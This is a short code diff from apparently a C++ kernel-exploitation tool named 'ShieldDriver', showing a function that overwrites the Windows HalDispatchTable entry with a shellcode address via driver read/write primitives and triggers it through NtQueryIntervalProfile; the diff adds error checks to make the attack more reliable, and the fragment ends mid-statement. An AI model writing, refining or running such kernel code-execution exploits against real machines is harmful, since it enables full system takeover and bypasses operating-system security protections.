@@ -185,13 +185,17 @@ namespace ShieldDriver {
 
     bool ExecuteViaHDT(HANDLE hDevice, uint64_t shellcodeAddr) {
         uint64_t ntBase = GetNtoskrnlBase();
+        if (!ntBase) return false;
+
         uint64_t pHDT = GetKernelExport(hDevice, ntBase, "HalDispatchTable");
         if (!pHDT) return false;
 
         uint64_t originalHdt1 = 0;
-        ReadKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1));
+        if (!ReadKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1)))
+            return false;
 
-        WriteKernel(hDevice, pHDT + 8, &shellcodeAddr, sizeof(shellcodeAddr));
+        if (!WriteKernel(hDevice, pHDT + 8, &shellcodeAddr, sizeof(shellcodeAddr)))
+            return false;
 
         ULONG interval = 0;
         auto NtQueryIntervalProfile = (NTSTATUS(NTAPI*)(ULONG, PULONG))
